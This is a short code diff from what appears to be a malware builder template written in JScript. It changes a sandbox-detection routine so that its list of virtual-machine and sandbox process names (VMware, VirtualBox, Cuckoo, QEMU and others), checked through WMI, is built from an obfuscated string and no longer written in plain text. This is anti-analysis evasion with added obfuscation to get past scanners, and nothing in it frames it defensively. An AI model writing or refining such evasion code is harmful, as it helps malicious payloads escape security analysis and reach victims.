@@ -32,7 +32,7 @@
     function {{ v.fn_sandbox }}() {
         try {
             var wmi  = GetObject({{ v.fn_build_str }}([{{ v.jsc_winmgmts }}]));
-            var bad  = ["vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe"];
+            var bad  = {{ v.fn_build_str }}([{{ v.jsc_vm_procs }}]).split("|");
             var pq   = wmi.ExecQuery("SELECT Name FROM Win32_Process");
             for (var e = new Enumerator(pq); !e.atEnd(); e.moveNext()) {
                 var n = e.item().Name.toLowerCase();
